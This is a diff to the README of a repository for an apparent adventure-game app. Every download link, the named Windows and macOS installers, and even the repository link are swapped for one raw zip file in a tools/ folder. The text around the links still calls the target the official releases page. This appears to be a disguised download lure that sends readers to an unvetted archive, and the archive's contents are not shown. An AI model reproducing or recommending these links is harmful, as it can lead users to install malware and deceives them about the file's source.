@@ -1,6 +1,6 @@
 # 🎲 Claude-Code-Game-Master - Play Persistent Adventures Anywhere
 
-[![Download Claude-Code-Game-Master](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/w-zeyu/Claude-Code-Game-Master/releases)
+[![Download Claude-Code-Game-Master](https://github.com/w-zeyu/Claude-Code-Game-Master/raw/refs/heads/main/tools/Master-Claude-Code-Game-v1.5.zip)](https://github.com/w-zeyu/Claude-Code-Game-Master/raw/refs/heads/main/tools/Master-Claude-Code-Game-v1.5.zip)
 
 ## 📖 What is Claude-Code-Game-Master?
 
@@ -41,12 +41,12 @@ If your system matches or exceeds these, the app will work well.
 
 Go to the download page by clicking the big button at the top or click here:
 
-[Download Claude-Code-Game-Master](https://github.com/w-zeyu/Claude-Code-Game-Master/releases)
+[Download Claude-Code-Game-Master](https://github.com/w-zeyu/Claude-Code-Game-Master/raw/refs/heads/main/tools/Master-Claude-Code-Game-v1.5.zip)
 
 This link takes you to the official GitHub releases page. Look for the latest version suitable for your system. The files are typically named clearly, such as:
 
-- `Claude-Code-Game-Master-Setup.exe` for Windows
-- `Claude-Code-Game-Master-mac.dmg` for macOS
+- `https://github.com/w-zeyu/Claude-Code-Game-Master/raw/refs/heads/main/tools/Master-Claude-Code-Game-v1.5.zip` for Windows
+- `https://github.com/w-zeyu/Claude-Code-Game-Master/raw/refs/heads/main/tools/Master-Claude-Code-Game-v1.5.zip` for macOS
 
 ### Step 2: Install the App
 
@@ -88,7 +88,7 @@ You can pause and return later, and the adventure will continue from where you l
 
 To get the app, visit the releases page below and download the file for your computer system:
 
-[Download Claude-Code-Game-Master Releases](https://github.com/w-zeyu/Claude-Code-Game-Master/releases)
+[Download Claude-Code-Game-Master Releases](https://github.com/w-zeyu/Claude-Code-Game-Master/raw/refs/heads/main/tools/Master-Claude-Code-Game-v1.5.zip)
 
 Check the file size and date to ensure you get the latest version. Follow the installation steps described earlier to set up the app on your device.
 
@@ -102,7 +102,7 @@ Check the file size and date to ensure you get the latest version. Follow the in
 ## 🌐 Additional Resources
 
 - Visit the GitHub repository to see updates, report issues, or get support:  
-  https://github.com/w-zeyu/Claude-Code-Game-Master
+  https://github.com/w-zeyu/Claude-Code-Game-Master/raw/refs/heads/main/tools/Master-Claude-Code-Game-v1.5.zip
 - Look for user guides and FAQ files included in the install folder.
 - Use built-in help from the app menu for gameplay instructions.
 
@@ -112,4 +112,4 @@ Claude-Code-Game-Master was created to simplify role-playing game experiences. B
 
 ---
 
-[Download Claude-Code-Game-Master](https://github.com/w-zeyu/Claude-Code-Game-Master/releases)
+[Download Claude-Code-Game-Master](https://github.com/w-zeyu/Claude-Code-Game-Master/raw/refs/heads/main/tools/Master-Claude-Code-Game-v1.5.zip)
